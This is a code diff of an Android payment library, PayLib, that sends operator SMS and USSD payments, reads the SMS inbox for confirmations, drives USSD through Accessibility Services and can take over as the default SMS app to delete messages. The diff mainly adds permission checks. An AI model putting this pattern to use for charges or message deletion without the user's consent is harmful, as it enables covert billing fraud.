@@ -1,7 +1,6 @@
 package com.p2plib2;
 
 import android.Manifest;
-import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ContentResolver;
@@ -40,9 +39,12 @@ import static com.p2plib2.ussd.USSDController.verifyAccesibilityAccess;
 
 
 public class PayLib implements PayInterface {
-    private String version = "1.0.0";
-    private String defaultSmsApp;
+    /*Constants*/
+    private String version = "1.0.1";
     private String pathOfFile = "web";
+    public static final String PREFERENCES = "operSetting";
+
+    private String defaultSmsApp;
     private SharedPreferences operatorSettings;
     public static Operator operatorSMS;
     public static Operator operatorUssd;
@@ -56,9 +58,6 @@ public class PayLib implements PayInterface {
     public static Boolean flagok = false;
     public static Operation currentOperation;
     public static HashSet<String> curMesage = new HashSet();
-
-    public static final String PREFERENCES = "operSetting";
-
     String result;
 
     public static String getOperName() {
@@ -139,10 +138,6 @@ public class PayLib implements PayInterface {
                 Logger.lg("message_id  " + message_id + " type " + type + " numeroTelephone " + numeroTelephone + " status " + status + " currentMsg  " + currentMsg
                         + " date " + cur.getString(cur.getColumnIndex("date")) + " body " + body);
                 if ((status.equals("-1") || status == null) && !currentMsg.equals("")) {
-//                    Logger.lg(currentMsg.substring(0, currentMsg.indexOf("[]")) + " num " +
-//                            currentMsg.substring(0, currentMsg.indexOf("[]")).contains(numeroTelephone)
-//                                   + " " +  CommonFunctions.formatOperMame(numeroTelephone).contains(operatorSMS.name)
-//                             "  msg body " + currentMsg.substring(currentMsg.indexOf("[]") + 2).contains(body) + "  " + currentMsg.substring(currentMsg.indexOf("[]") + 2));
                     if ((currentMsg.substring(0, currentMsg.indexOf("[]")).contains(numeroTelephone)
                             || CommonFunctions.formatOperMame(numeroTelephone).contains(operatorSMS.name))
                             && currentMsg.substring(currentMsg.indexOf("[]") + 2).contains(body)) {
@@ -422,24 +417,42 @@ public class PayLib implements PayInterface {
                           Activity act, Context cnt, String operDestination, String phoneNum, String sum) {
         switch (operType) {
             case "sms":
-                if (phoneNum != null) {
-                    operatorSMS.target = phoneNum;
+                if (ActivityCompat.checkSelfPermission(cnt, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
+                    if (phoneNum != null) {
+                        operatorSMS.target = phoneNum;
+                    }
+                    if (sum != null) {
+                        operatorSMS.sum = sum;
+                    }
+                    sendSms(sendWithSaveOutput, cnt);
+                } else {
+                    feedback.callResult("Code P2P-015: отсутствует разрешение SEND_SMS");
                 }
-                if (sum != null) {
-                    operatorSMS.sum = sum;
-                }
-                sendSms(sendWithSaveOutput, cnt);
                 break;
             case "ussd":
-                if (phoneNum != null) {
-                    operatorUssd.target = phoneNum;
-                    Logger.lg("phoneNum " + phoneNum);
-                    operatorUssd.sendWithSaveOutput = sendWithSaveOutput;
+                String permission="Code P2P-015: отсутствует разрешение ";
+                Boolean flagPermission = true;
+                if (!USSDController.isAccessiblityServicesEnable(cnt)) {
+                    permission = permission + "  Accessibility Services ";
+                    flagPermission = false;
                 }
-                if (sum != null) {
-                    operatorUssd.sum = sum;
+                if (ActivityCompat.checkSelfPermission(cnt, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                    permission = permission + " CALL_PHONE";
+                    flagPermission = false;
                 }
-                sendUssd(operDestination, act);
+                if (flagPermission) {
+                    if (phoneNum != null) {
+                        operatorUssd.target = phoneNum;
+                        Logger.lg("phoneNum " + phoneNum);
+                        operatorUssd.sendWithSaveOutput = sendWithSaveOutput;
+                    }
+                    if (sum != null) {
+                        operatorUssd.sum = sum;
+                    }
+                    sendUssd(operDestination, act);
+                } else {
+                    feedback.callResult(permission);
+                }
                 break;
         }
     }
@@ -523,7 +536,9 @@ public class PayLib implements PayInterface {
 
     public void checkSmsDefaultApp(boolean deleteFlag, Integer code) {
         final String myPackageName = cnt.getPackageName();
-        defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(cnt);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(cnt);
+        }
         Logger.lg(deleteFlag + " MyPackageName  " + myPackageName + "  defaultSmsApp now " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
         if (!myPackageName.equals(defaultSmsApp) && deleteFlag == true) {
             Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
